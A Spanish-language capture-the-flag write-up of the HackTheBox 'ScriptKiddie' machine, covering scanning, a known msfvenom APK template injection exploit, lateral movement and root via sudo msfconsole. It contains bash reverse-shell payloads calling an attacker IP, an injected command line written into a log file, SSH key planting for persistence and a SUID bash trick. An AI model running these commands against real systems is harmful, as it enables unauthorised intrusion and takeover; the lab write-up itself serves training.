---
title: "ScriptKiddie Write-UP | HackTheBox"
date: "2021-04-20"
categories: [Write-Ups, HackTheBox]
tags: [CTFs, HackTheBox, Write-Ups]
media_subpath: /assets/img/posts/2021-04-20-scriptkiddie-write-up-hackthebox
image:
   path: header/card_scriptkiddie.webp
   lqip: data:image/webp;base64,UklGRkQAAABXRUJQVlA4IDgAAACQAwCdASoUAAsAPzmGulOvKKWisAgB4CcJZQAAW+uEaDUmTEAAAP66ezUrPdzaOMM9nLrHSCwAAA==
   
published: true
---

## Descripción

En esta máquina **ScriptKiddie** de la plataforma **Hackthebox** con dificultad "Easy" y OS Linux, haremos uso de exploits para CVE conocido, encontraremos archivos para realizar movimiento lateral hacia otro usuario del sistema y veremos como podemos utilizar la herramienta de "msfconsole" para poder ejecutar root shell a través de privilegios SUDO.

Como punto a comentar, la dirección IP de la máquina activa y la que se muestran en las imágenes y/o comandos utilizados son diferentes, ya que se ha utilizado instancia personal para la realización de dicho laboratorio.

## Escaneo y Enumeración

Comenzaremos como siempre con una traza ICMP para descubrir el tipo de SO que utiliza la máquina objetivo en base al TTL.

Nos encontramos con una máquina de SO GNU/Linux:

```bash
PING 10.129.134.41 (10.129.134.41) 56(84) bytes of data.
64 bytes from 10.129.134.41: icmp_seq=1 ttl=63 time=49.8 ms

--- 10.129.134.41 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 49.844/49.844/49.844/0.000 ms
```

Hacemos uso de la herramienta NMAP para descubrir puertos abiertos:

```bash
# nmap -sS -T5 -p- --min-rate 5000 --open -n -v -oG allPorts -oN initScan 10.129.134.41
Nmap scan report for 10.129.99.174
Host is up (0.081s latency).
Not shown: 65113 closed ports, 420 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT     STATE SERVICE
22/tcp   open  ssh
5000/tcp open  upnp
```

Observamos que tiene 2 puertos abiertos corriendo los servicios: **SSH(22) y UPnP(5000)**.

Lanzamos nuevamente NMAP para intentar descubrir vulnerabilidades conocidas y versión utilizada por los servicios corriendo en los puertos abiertos:

```bash
# nmap -sC -sV -n -v -p22,5000 -oN targeted 10.129.134.41
Nmap scan report for 10.129.99.174
Host is up (0.28s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 3c:65:6b:c2:df:b9:9d:62:74:27:a7:b8:a9:d3:25:2c (RSA)
|   256 b9:a1:78:5d:3c:1b:25:e0:3c:ef:67:8d:71:d3:a3:ec (ECDSA)
|_  256 8b:cf:41:82:c6:ac:ef:91:80:37:7c:c9:45:11:e8:43 (ED25519)
5000/tcp open  http    Werkzeug httpd 0.16.1 (Python 3.8.5)
| http-methods:
|_  Supported Methods: GET OPTIONS POST HEAD
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d'5 h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Vemos que en el puerto 5000 está corriendo un servicio Web un título muy indicado para el sitio **"k1d'5 h4ck3r t00l5"**. Vamos a ver que tiene...:

Utilizamos la herramienta **whatweb** para identificar de una pasada el sitio web:

```bash
whatweb <http://10.129.134.41:5000>

<http://10.129.134.41:5000> [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/0.16.1 Python/3.8.5], IP[10.129.134.41], Python[3.8.5], Title[k1d'5 h4ck3r t00l5], Werkzeug[0.16.1]
```

Cuando accedemos, podemos ver como dispone de varias herramientas: **_NMAP_**, **_MSFVENOM_** y **_SEARCHSPLOIT_**.

![](body/3ac35f33bb54431c6e2e00c26969abd70f917f69-1.png)

Lo primero que intento es ver si puedo escapar los comandos bash introducidos en el input de **searchsploit**, ya que el output de este lo muestra en la web, pero no hay forma. Este Script Kiddie me avisa de que no intente hackearle...

![](body/bfeccfe652a11ab0e8375f7a9f25ca5d377700b2-1.png)

Pruebo la herramienta de NMAP de la página y lanzo TCPDUMP para ver qué está pasando por detrás, y efectivamente se genera tráfico.

Me llama la atención la parte de la herramienta **MSFVENOM**. Cuando indico el OS a utilizar como Windows e introduzco una dirección IP aleatoria, este genera un ejecutable basado en plantilla, por lo que me hace pensar en algún posible archivo malicioso que pueda subir con la opción de template, así que vamos a buscar.

Buscamos algún CVE que haga referencia a **msfvenom** o **metasploit** y nos encontramos con [CVE-2020-7384](https://nvd.nist.gov/vuln/detail/CVE-2020-7384).

Encontramos un posible exploit con ejecución de comandos con la utilidad de **searchsploit**:

```bash
searchsploit msfvenom

 Exploit Title                                                               |  Path                   |
 Metasploit Framework 6.0.11 - msfvenom APK template command injection       | multiple/local/49491.py |
 Shellcodes: No Results
 Papers: No Results
```

Movemos el exploit a nuestro directorio y si cambiamos el nombre para identificarlo de mejor manera.

## Explotación

Ahora es cuando nos ponemos a jugar, abrimos el exploit y modificamos la variable **PAYLOAD** para inyectar nuestra propia reverse shell, en este caso vamos a utilizar la de bash:

```bash
# Change me
payload = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.14.21/443 0>&1'"
```

He modificado un poco el script para que el directorio donde genere el template sea el actual en el que trabajo, por defecto lo creará en **/tmp** con la función de python **mkdtemp**.

Ejecutamos el exploit descargado y nos generará un archivo APK malicioso con nombre "**evil.apk**", que será el que subiremos como template en la página, seleccionando en OS Android y dirección IP que queramos, ya que la revershe shell se encuentra en la variable **Payload** que hemos definido.

Ponemos **nc** a la escucha en el puerto indicando anteriormente en la variable de **Payload** y subimos el archivo.

Accedemos a la máquina como usuario **Kid.**

```bash
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.129.134.41] 40300
bash: cannot set terminal process group (906): Inappropriate ioctl for device
bash: no job control in this shell
kid@scriptkiddie:~/html$ whoami
whoami
kid
kid@scriptkiddie:~/html$ id
id
uid=1000(kid) gid=1000(kid) groups=1000(kid)
kid@scriptkiddie:~/html$
```

Pasamos a enumerar directorios y archivos en la máquina cuando veo que tiene el archivo "**authorized\_keys**" con permisos de escritura, por lo que me dispongo a introducir mi llave pública para mantener acceso en caso de pérdida de reverse shell.

Accedo por SSH con el usuario kid para obtener una tty completamente interactiva.

```bash
kid@scriptkiddie:~/.ssh$ ls -la
total 8
drwx------ 2 kid kid 4096 Feb 10 16:11 .
drwxr-xr-x 11 kid kid 4096 Feb  3 11:49 ..
-rw-rw-r-- 1 kid kid    0 Feb 10 16:10 authorized_keys
```

```bash
kid@scriptkiddie:~/.ssh$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCkIWLV6Ybj4zM1fOtkWZeCS3ryYMllRXg8SQ5hvxlDbkga1eRPA4R43cr9Ydu9r4c8bHwxeFlLdamODRKmDpa1gtM9y8RnPZ..." >> authorized_keys
```

### User Flag

Podemos ver la flag de usuario en el directorio de Kid:

```bash
kid@scriptkiddie:~$ wc -c user.txt 
33 user.txt
```

Enumeramos los usuarios que existen a nivel de sistema y sus directorios.

Vemos que existe otro usuario llamado **pwn**, así que tocará movimiento lateral:

```bash
kid@scriptkiddie:~$ grep "sh$" /etc/passwd
root:x:0:0:root:/root:/bin/bash
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
```

## Movimiento Lateral

Enumeramos el directorio del usuario **pwn**, observamos que tenemos permisos de lectura, a su vez vemos que tiene un binario bash con nombre "**scanlosers.sh**":

```bash
kid@scriptkiddie:~$ ls -l /home/pwn
total 8
drwxrw---- 2 pwn pwn 4096 Feb 19 11:30 recon
-rwxrwxr-- 1 pwn pwn  250 Jan 28 17:57 scanlosers.sh
```

Echando un ojo al código del script, vemos que la variable **log** hace referencia a un archivo en el directorio del usuario **Kid** llamado "hackers", este archivo está siendo añadido como parámetro para la utilidad **cat** y acto seguido ejecuta la utilidad Nmap.

Me hace pensar que puede tener una tarea cron o similar para ejecutar el archivo "scanlosers.sh". Me pongo a enumerar tareas que se ejecutan a nivel de sistema en intervalos regulares de tiempo, pero no encuentro ninguna.

```bash
kid@scriptkiddie:/home/pwn$ cat scanlosers.sh 
#!/bin/bash

log=/home/kid/logs/hackers

cd /home/pwn/
cat $log | cut -d' ' -f3- | sort -u | while read ip; do
    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
done

if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
```

```bash
kid@scriptkiddie:/home/pwn$ ls -l /home/kid/logs/hackers 
-rw-rw-r-- 1 kid pwn 0 Feb  3 11:46 /home/kid/logs/hackers ****
```

El archivo "hackers" tiene permisos de lectura y escritura para el usuario **kid** y grupo **pwn** (el usuario propietario del script). Rápidamente me hace pensar en añadir en el archivo "hackers" una inyección de comandos concatenando parámetros:

```bash
echo "x  ;bash -c 'bash -i >& /dev/tcp/10.10.14.21/1337 0>&1' #" > hackers
```

**Importante:** Cuando se lanza la inyección de comando, justo detrás de "x" hay añadir 2 espacios en blanco. Estuve probando el por qué de esto, pero no encontré explicación. Recordar también añadir al final del comando el hashtag "#" para comentar el resto del comando y que no se ejecute.

Obtenemos shell del usuario **pwn**:

![](body/7cfcc69a84704d4945757c06deaf99c64ef0257e.png)

## Escalada de privilegios

Enumeramos los permisos que tenemos como "**sudo**" y nos encontramos que podemos ejecutar como **sudo** y sin contraseña el binario **msfconsole**:

```bash
pwn@scriptkiddie:~$ sudo -l
 Matching Defaults entries for pwn on scriptkiddie:
     env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 User pwn may run the following commands on scriptkiddie:
     (root) NOPASSWD: /opt/metasploit-framework-6.0.9/msfconsole
```

Para **msfconsole** existe un parámetro que nos permite ejecutar comandos al lanzar la consola de MetaSploit, este parámetro es **\-x**:

```bash
bash-5.0$ msfconsole --help | grep "-x"
-x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
```

Inyectamos el comando para escalar privilegios como usuario **root**:

```bash
pwn@scriptkiddie:~$ sudo msfconsole -x "/bin/chmod 4755 /bin/bash" 
 -- --=[ 2069 exploits - 1122 auxiliary - 352 post       ]
 -- --=[ 592 payloads - 45 encoders - 10 nops            ]
 -- --=[ 7 evasion                                       ] 
 Metasploit tip: You can use help to view all available commands

[*] exec: /bin/chmod 4755 /bin/bash # <-- Comando ejecutado correctamente

msf6 >
```

Vemos que se ha ejecutado correctamente y nos ha permitido asignarle permisos **SUID** al binario **/bin/bash**.

Por último, nos queda ejecutar **bash** con privilegios de propietario root y visualizar la flag:

```bash
msf6 > bash -p
 [*] exec: bash -p
 root@scriptkiddie:/home/pwn# whoami
 root
 root@scriptkiddie:/home/pwn# id
 uid=0(root) gid=0(root) groups=0(root)
 root@scriptkiddie:/home/pwn#
```

### Root Flag

Visualizamos la flag del usuario **root**:

```bash
root@scriptkiddie:~# wc -c root.txt 
 33 root.txt
```
